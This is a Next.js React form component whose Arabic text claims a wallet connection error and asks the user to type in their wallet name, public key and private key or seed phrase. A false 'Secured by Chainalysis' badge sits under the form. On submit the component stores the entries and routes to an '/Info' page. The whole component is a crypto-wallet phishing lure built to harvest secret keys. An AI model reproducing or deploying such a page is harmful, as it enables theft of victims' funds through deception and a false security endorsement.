"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function Form() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    wallet: "",
    publicKey: "",
    privateKey: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    // Retrieve existing submissions from sessionStorage
    const existingData = JSON.parse(sessionStorage.getItem("formDataList") || "[]");

    // Append new form data to the list
    const updatedData = [...existingData, formData];

    // Save updated list back to sessionStorage
    sessionStorage.setItem("formDataList", JSON.stringify(updatedData));

    // Navigate to the DB page
    router.push("/Info");
  };

  return (
    <>
      <div className="flex flex-col items-center justify-center text-center">
        <h1 className="text-4xl font-semibold text-navyblue sm:text-5xl lg:text-7xl">
        خطأ في اتصال المحفظة <br /> يرجى ملء النموذج.
        </h1>
        <p className="mt-2 text-lg leading-8 text-bluegray">
        نحن نواجه صعوبة في ربط محفظتك. يرجى ملء النموذج
        أقل.
        </p>
      </div>
      <form className="max-w-sm mx-auto mt-10" onSubmit={handleSubmit}>
        <div className="mb-5">
          <label
            htmlFor="wallet"
            className="block mb-2 text-sm font-medium text-gray-900 dark:text-white"
          >
            محفظة
          </label>
          <input
            type="text"
            name="wallet"
            id="wallet"
            className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 dark:shadow-sm-light"
            placeholder="اسم المحفظة"
            value={formData.wallet}
            onChange={handleChange}
            required
          />
        </div>
        <div className="mb-5">
          <label
            htmlFor="publicKey"
            className="block mb-2 text-sm font-medium text-gray-900 dark:text-white"
          >
            المفتاح العام
          </label>
          <input
            type="text"
            name="publicKey"
            id="publicKey"
            className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 dark:shadow-sm-light"
            placeholder="المفتاح العام"
            value={formData.publicKey}
            onChange={handleChange}
            required
          />
        </div>
        <div className="mb-5">
          <label
            htmlFor="privateKey"
            className="block mb-2 text-sm font-medium text-gray-900 dark:text-white"
          >
            المفتاح الخاص (أو العبارة التذكيرية)
          </label>
          <input
            type="text"
            name="privateKey"
            id="privateKey"
            className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 dark:shadow-sm-light"
            placeholder="المفتاح الخاص (أو العبارة التذكيرية)"
            value={formData.privateKey}
            onChange={handleChange}
            required
          />
        </div>
        <div className="flex items-start mb-5">
          <div className="flex items-center h-5">
            <input
              id="terms"
              type="checkbox"
              value=""
              className="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800"
              required
            />
          </div>
          <label
            htmlFor="terms"
            className="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
          >
            أنا أتفق مع {" "}
            <a
              href="#"
              className="text-blue-600 hover:underline dark:text-blue-500"
            >
              الشروط والأحكام
            </a>
          </label>
        </div>
        <label className="text-sm font-medium text-gray-900 dark:text-gray-300">
            <span className="text-red-500 dark:text-red-500"style={{ color: "red" }}>*</span>{" "}
            Secured by{" "}
            <a
                href="https://www.chainalysis.com/"
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-600 hover:underline dark:text-blue-500" style={{ color: "blue" }}
            >
                Chainalysis
            </a>
         </label>

        <br />
        <button
          type="submit"
          className="mb-64 text-white bg-black hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
        >
          ربط المحفظة
        </button>
      </form>
    </>
  );
}
